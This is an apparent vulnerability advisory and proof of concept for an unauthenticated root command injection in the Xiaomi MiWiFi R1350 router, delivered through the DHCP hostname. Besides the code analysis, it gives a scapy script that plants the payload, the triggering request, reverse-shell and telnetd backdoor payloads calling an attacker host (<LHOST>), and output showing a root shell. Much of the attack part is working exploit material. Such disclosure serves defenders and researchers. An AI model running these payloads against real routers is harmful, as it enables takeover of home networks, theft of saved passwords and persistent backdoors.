# Xiaomi MiWiFi R1350 Router

- Vendor: Xiaomi
- Product: Xiaomi AIoT Router R1350 (AC1200)
- Firmware Version: 1.0.31 (miwifi_r1350_firmware_7449d_1.0.31.bin, QSDK / OpenWrt, MIPS32 big-endian)
- Vulnerability Type: Unauthenticated OS Command Injection (CWE-78)

## Overview

An unauthenticated command injection vulnerability exists in the Xiaomi MiWiFi R1350 router (firmware 1.0.31). A LAN-side attacker can gain arbitrary command execution with root privileges **without any authentication or knowledge of the admin password**. The injection is triggered via the following endpoint:

`GET /cgi-bin/luci/api/misns/sns_init?callback=x HTTP/1.1`

The route is registered with authorization flag `0x01` (`noauth`), which bypasses the LuCI `sysauth` session check entirely (see `luci/dispatcher.lua` `_noauthAccessAllowed`, bit 0x01). Exploitation requires the attacker to have obtained a DHCP lease from the router once (default for any LAN client), because the injected data travels through the DHCP client hostname.

## Vulnerability Details

The web stack is `nginx :80 → fastcgi (spawn-fcgi/fcgi-cgi on 127.0.0.1:8920) → /www/cgi-bin/luci (Lua, LuCI dispatcher)` running as root.

Taint chain (all paths relative to firmware root):

1. **Source — DHCP hostname.** The attacker-controlled DHCP option 12 (host name) is stored verbatim by dnsmasq into `/tmp/dhcp.leases` (4th whitespace-separated field). No character filtering is applied:
   ```
   1900000000 f8:fe:5e:46:33:f9 192.168.1.4 $(id>/tmp/pwned)
   ```

2. **Read — `xiaoqiang/util/XQDeviceUtil.lua:122-157` (`getDHCPList`)** parses each lease line with `line:match("^(%d+) (%S+) (%S+) (%S+)")`; the hostname field accepts any non-whitespace characters (including `$ ( ) { } | & ; \` "` shell metacharacters) and is returned unmodified.

3. **Sink — `luci/controller/api/misns.lua:92-109` (`snsInit`)**:
   ```lua
   -- misns.lua:17  entry({"api","misns","sns_init"}, call("snsInit"), (""), 206, 0x01)  -- 0x01 = noauth
   -- misns.lua:103 local mac = luci.dispatcher.getremotemac()          -- attacker IP -> ARP -> its own MAC
   -- misns.lua:105 local dhcpinfo = XQDeviceUtil.getDHCPDict()[mac] or {}
   -- misns.lua:106 local dhcp = dhcpinfo["name"] or ""                 -- attacker's DHCP hostname, no sanitization
   -- misns.lua:107 local cmd = string.format("matool --method enc --params \"{\\\"mac\\\":\\\"%s\\\",\\\"dhcp\\\":\\\"%s\\\"}\"", mac, dhcp)
   -- misns.lua:108 result.clientinfo = LuciUtil.trim(LuciUtil.exec(cmd))  -- io.popen -> /bin/sh -c
   ```

   `dhcp` is interpolated into a **double-quoted** shell string without any escaping. The sibling controller `api/miats.lua` sanitizes the same kind of parameter with `XQFunction._cmdformat()` (which escapes `` \ ` " $ ``); `misns.lua` omits this call — the omission is the root cause.

4. **Execution.** The final command handed to `/bin/sh -c` is:
   ```
   matool --method enc --params "{\"mac\":\"f8:fe:5e:46:33:f9\",\"dhcp\":\"$(id>/tmp/pwned)\"}"
   ```
   Because the payload sits inside double quotes, `$(...)`, backticks and `${...}` are expanded by the shell. The DHCP hostname must not contain whitespace (`%S+` parsing truncates it); `${IFS}` substitutes spaces.

## Proof of Concept

Step 1 — plant the payload as the DHCP hostname of the attacker machine (any DHCP client that allows a raw option-12 value works; example with a Linux attacker):

```bash
# one-shot with scapy (or simply set the system host name and reconnect)
python3 -c "
from scapy.all import Ether/IP/UDP/BOOTP/DHCP
hostname = '\$(telnetd -p 1337 -l /bin/sh)'   # no spaces: use \${IFS} if needed
dhcp = DHCP(options=[('message-type','discover'),(12,hostname),('param_req_list',[1,3,6,15]),'end'])
sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/IP(src='0.0.0.0',dst='255.255.255.255')/UDP(sport=68,dport=67)/BOOTP(chaddr=...)/dhcp)
"
```

dnsmasq writes the hostname verbatim to `/tmp/dhcp.leases`.

Step 2 — trigger the injection (no authentication; works from the same machine whose hostname was planted, because `getremotemac()` maps the request source IP to the lease MAC):

```http
GET /cgi-bin/luci/api/misns/sns_init?callback=poc HTTP/1.1
Host: 192.168.31.1

```

Response (the handler still returns normal JSONP):

```json
poc({"deviceid":"","clientinfo":"","ssid":"  小米共享WiFi_","code":0});
```

curl one-liner:

```bash
curl -s "http://<router>/cgi-bin/luci/api/misns/sns_init?callback=poc"
```

Reverse shell payloads for the hostname (busybox `nc` in this firmware has no `-e`):

```
# dual-channel reverse shell (robust)
$(tail${IFS}-f${IFS}/dev/null|nc${IFS}<LHOST>${IFS}7411|/bin/sh|nc${IFS}<LHOST>${IFS}7412)

# or a telnetd backdoor (stock firmware has /proc/xiaoqiang/ft_mode, so telnetd starts normally)
$(telnetd${IFS}-p${IFS}1337${IFS}-l${IFS}/bin/sh)
```

## Impact

Any LAN client (or anyone who can make a client obtain a DHCP lease, e.g. over the default open-ish Wi-Fi provisioning window / WPS) can execute arbitrary commands as **root** — the fastcgi-spawned Lua backend runs as root — leading to full device compromise: credential theft (saved PPPoE/Wi-Fi passwords), persistent backdoors, DNS hijacking and pivoting into the home network. No authentication is required at any point.

## Reproduction Result

The vulnerability was dynamically verified against the firmware emulated with qemu-mips (user mode) + chroot, with the original `nginx → fcgi-cgi → LuCI` stack serving HTTP on port 80 and a lease line planted as the DHCP hostname:

```
$ curl -s "http://192.168.1.5/cgi-bin/luci/api/misns/sns_init?callback=poc"
poc({"deviceid":"","clientinfo":"","ssid":"  小米共享WiFi_","code":0});

$ cat /tmp/pwned
uid=0(root) gid=0(root) groups=0(root)
```

An interactive root shell was also bounced from the emulated router to the Windows attack host (dual-channel `nc` payload, hostname `$(tail${IFS}-f${IFS}/dev/null|nc...|/bin/sh|nc...)`):

```
[+] cmd channel from ('192.168.1.5', 58744)
[+] out channel from ('192.168.1.5', 48154)
=== SHELL OUTPUT ===
uid=0(root) gid=0(root) groups=0(root)
Linux iotseczone 6.8.0-136-generic ... mips GNU/Linux
===PWNED-BY-MISNS-SNS-INIT===
```
